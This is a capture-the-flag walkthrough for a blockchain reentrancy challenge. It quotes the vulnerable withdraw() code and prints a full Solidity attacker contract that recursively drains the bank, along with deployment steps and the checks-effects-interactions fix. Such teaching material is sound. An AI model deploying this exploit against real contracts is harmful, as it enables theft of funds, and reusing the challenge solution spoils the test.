# REENTRANCE PROBLEM GUIDE:

*(Blockchain — Hard, 400pt)*

## HINTS:
Hint 1: If a bank pays you before updating your balance, what stops you re-entering the line?
Hint 2: What function fires when a contract receives Ether?

## TOOLS:
Remix IDE ; MetaMask ; `web3.py`

## WALKTHROUGH:
1. `VulnBank.sol`: `withdraw()` sends Ether **before** decrementing the balance:
    - `(bool sent,) = msg.sender.call{value: amount}(""); balances[msg.sender] -= amount;`
    - Flag reveals when the bank balance hits 0. The check-then-send-then-update order is the classic reentrancy hole.

2. Write an attacker contract whose `receive()` calls `withdraw` again while the bank balance is still positive:
```solidity
contract Exploit {
    IVulnBank public bank;
    constructor(address b) public { bank = IVulnBank(b); }
    function attack() external payable { bank.deposit{value: 1 ether}(); bank.withdraw(1 ether); }
    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw(1 ether);
        else if (address(bank).balance > 0) bank.withdraw(address(bank).balance);
    }
}
```

3. Deploy via Remix (compiler 0.6.x, MetaMask wallet imported from the challenge private key, `_bankAddress` = bank), then call `attack()` (from `web3.py` or Remix). The recursive `receive()` drains the vault to 0:
    - Flag shows on the challenge status page.
        - Answer: `picoCTF{...}` (instance-specific)

## NOTES:
- Reentrancy: an external `call` hands control to the recipient's `receive()`/`fallback` before state is updated, letting it re-enter `withdraw` repeatedly.
- Fix is checks-effects-interactions (update balance *before* sending) or a `nonReentrant` guard.
